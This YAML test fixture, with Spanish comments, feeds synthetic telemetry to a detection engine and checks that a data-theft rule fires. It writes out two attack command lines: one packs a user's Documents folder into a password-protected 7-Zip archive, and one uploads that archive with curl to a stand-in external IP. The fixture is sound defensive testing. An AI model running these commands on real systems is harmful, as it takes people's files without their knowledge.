# Escenarios de validacion de deteccion (SIM-1/SIM-2).
# Telemetria sintetica e inerte: el mismo esquema de eventos que
# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
# declara las alertas que el motor DEBE disparar (shipped rule/sequence
# id); el test de CI falla si una deja de detectarse.

- name: 'Robo de datos: compresion y subida (sintetico)'
  id: sim-chain-7a31-6f1d
  description: 'Secuencia sintetica que completa la cadena: empaquetado con contrasena y subida por curl. Telemetria
    inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1560.001
  - t1048.003
  host: LAB-SIM-CHAIN2
  user: CORP\sim
  expected:
  - rule: 5e0c7a31-6f1d-4b8e-9a52-1c3d4e5f6a70
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4340
      name: 7za.exe
      command_line: 7za.exe a -pS3cret! C:\Users\Public\staged.7z C:\Users\sim\Documents
  - type: process.create
    user: CORP\sim
    process:
      pid: 4341
      name: curl.exe
      command_line: curl.exe -T C:\Users\Public\staged.7z https://203.0.113.12/upload
